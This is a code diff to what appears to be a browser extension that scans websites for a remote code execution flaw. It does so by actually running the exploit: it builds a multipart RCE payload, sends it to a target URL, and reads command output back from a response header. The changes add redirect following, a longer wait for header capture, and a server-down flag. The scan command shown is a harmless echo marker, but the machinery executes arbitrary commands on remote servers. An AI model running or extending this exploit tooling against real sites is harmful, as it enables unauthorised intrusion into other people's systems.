@@ -101,6 +101,25 @@ function buildRCEPayload(command) {
         `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`;
 }
 
+// Follow redirects to get the actual URL
+async function resolveUrl(url, timeout = 5000) {
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), timeout);
+
+        const response = await fetch(url, {
+            method: 'GET',
+            redirect: 'follow',
+            signal: controller.signal
+        });
+
+        clearTimeout(timeoutId);
+        return response.url; // Returns final URL after redirects
+    } catch (e) {
+        return url; // Return original if resolution fails
+    }
+}
+
 async function executeExploit(targetUrl, payload, timeout) {
     lastCapturedOutput = null;
 
@@ -122,9 +141,12 @@ async function executeExploit(targetUrl, payload, timeout) {
         });
 
         clearTimeout(timeoutId);
-        await new Promise(resolve => setTimeout(resolve, 100));
+        await new Promise(resolve => setTimeout(resolve, 500)); // Wait for header capture
 
         const responseText = await response.text();
+
+        // Check if server is down (5xx errors except 500 which might be exploit-related)
+        const serverDown = response.status === 502 || response.status === 503 || response.status === 504;
 
         // Try to get output from captured header
         let output = null;
@@ -143,6 +165,7 @@ async function executeExploit(targetUrl, payload, timeout) {
         return {
             success: output !== null,
             vulnerable: false, // Let caller decide based on scan type
+            serverDown: serverDown,
             output: output,
             status: response.status
         };
@@ -170,17 +193,22 @@ browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
     }
 
     if (message.type === 'scan') {
-        // Always use active scan - execute echo command and check for marker
-        const command = 'echo VULN_MARKER_12345';
-        const payload = buildRCEPayload(command);
+        // First resolve the URL to follow any redirects
+        resolveUrl(message.url)
+            .then(resolvedUrl => {
+                // Always use active scan - execute echo command and check for marker
+                const command = 'echo VULN_MARKER_12345';
+                const payload = buildRCEPayload(command);
 
-        executeExploit(message.url, payload, message.timeout || 10)
-            .then(result => {
-                // Only mark as vulnerable if we see the actual marker in output
-                const vulnerable = result.output && result.output.includes('VULN_MARKER_12345');
-                result.vulnerable = vulnerable;
-                result.scanCommand = command;
-                sendResponse(result);
+                return executeExploit(resolvedUrl, payload, message.timeout || 10)
+                    .then(result => {
+                        // Only mark as vulnerable if we see the actual marker in output
+                        const vulnerable = result.output && result.output.includes('VULN_MARKER_12345');
+                        result.vulnerable = vulnerable;
+                        result.scanCommand = command;
+                        result.resolvedUrl = resolvedUrl;
+                        sendResponse(result);
+                    });
             })
             .catch(err => sendResponse({ success: false, vulnerable: false, error: err.message }));
         return true;
